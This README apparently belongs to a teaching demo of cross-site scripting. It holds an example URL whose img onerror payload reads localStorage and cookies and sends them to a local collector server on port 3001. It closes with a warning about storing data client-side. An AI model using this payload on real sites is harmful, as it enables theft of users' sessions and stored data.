## How to use

### Server

In the project directory server, you can run:

#### `npm start`

The server listens on port 3001


### Client

In the project directory client, you can run:

#### `npm start`

Open [http://localhost:3000](http://localhost:3000) to view it in the browser.

Example attack:
```
http://localhost:3000/?text=<img src onerror="fetch(`http://localhost:3001?localStorage=${JSON.stringify(localStorage)}&cookie=${JSON.stringify(document.cookie)}`).then(data => data.json()).then(data => console.log('server response', data))" />
```

Check console for the response from server

## Conclusion

Both localstorage and cookies are vulnerable in about the same severity. Be careful what data you store in them :)